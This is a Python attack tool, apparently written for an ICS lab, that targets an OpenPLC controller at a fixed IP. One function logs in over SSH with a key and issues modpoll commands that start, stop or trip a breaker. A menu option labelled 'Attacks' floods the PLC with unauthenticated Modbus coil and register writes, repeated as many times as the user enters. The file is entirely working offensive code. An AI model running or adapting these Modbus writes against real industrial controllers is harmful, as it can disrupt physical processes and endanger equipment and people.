from netmiko import ConnectHandler
from pymodbus.client import ModbusTcpClient
import time

class NetCon():
    def __init__(self, host, user):
        self.host = host
        self.user = user
        self.port = 22
        self.device_type = 'linux'

    def get_connection(self): 
        try:
            cred = {
                "device_type": self.device_type,
                "host": self.host,
                "username": self.user,
                "use_keys": True,
                "key_file": "/home/kali/.ssh/id_ed25519",
                "port": self.port,
            }
            print(f"[*] Attempting login using SSH Ed25519 key on {self.host}...")
            connection = ConnectHandler(**cred)
            return connection
                
        except Exception as e:
            print(f"Error 101! Connection failed: {e}") 
            return None

def connection_to_plc():
    plc = NetCon(host='192.41.15.1', user='student')
    ssh_session = plc.get_connection()
    if ssh_session:
        print("[+] Success! Connection established.")
        while True:
            try:
                b = int(input('1 - Start\n2 - Breaker Switch\n3 - Stop\nEnter a command: '))
                if b == 1:
                    result = ssh_session.send_command('modpoll -r 3 -t 0 127.0.0.1 1')
                    time.sleep(0.1)
                    result = ssh_session.send_command('modpoll -r 3 -t 0 127.0.0.1 0')
                    break
                elif b == 2:
                    result = ssh_session.send_command('modpoll -r 1 -t 0 127.0.0.1 1')
                    break
                elif b == 3:
                    result = ssh_session.send_command('modpoll -r 4 -t 0 127.0.0.1 1')
                    time.sleep(0.1)
                    result = ssh_session.send_command('modpoll -r 4 -t 0 127.0.0.1 0')
                    break
                else:
                    print('Invalid option! Please enter 1, 2, or 3.')
            except ValueError:
                print('Error! Please enter a correct number (1, 2, or 3).')

        print("Response from OpenPLC:")
        print("-" * 30)
        print(result)
        print("-" * 30)
        ssh_session.disconnect()
        print("Connection closed.")
    else:
        print("[-] Connection failed. Please check the IP address, credentials, or SSH service status.")

def attacks():
    plc = '192.41.15.1'
    client = ModbusTcpClient(plc, port=502)
    if not client.connect():
        print("[-] Connection to PLC failed.")
        return
    print("[+] Connected to PLC via Modbus TCP.")
    n = int(input('Enter the number of command sequences for the attack: '))
    for i in range(n):
        client.write_coil(1, True)
        client.write_register(1, 123)
        client.write_coils(1, [True, False, True])
        client.write_registers(1, [111, 222, 333])

        time.sleep(0.2)
    print(f'Attack completed. A total of commands were sent:{n*4}')
    
while True:
    print('\n========== MAIN MENU ==========')
    print('1. Attacks')
    print('2. Manage OpenPLC (SSH)')
    print('3. Exit program')
    print('===============================')
    try:
        choice = int(input('Make your choice: '))
        if choice == 1:
            attacks()
        elif choice == 2:
            connection_to_plc()
        elif choice == 3:
            print('Exiting... Good bye!')
            break
        else:
            print('[!] Invalid choice. Please select 1, 2, or 3.')
    except ValueError:
        print('[!] Error: Input must be a number.')
      
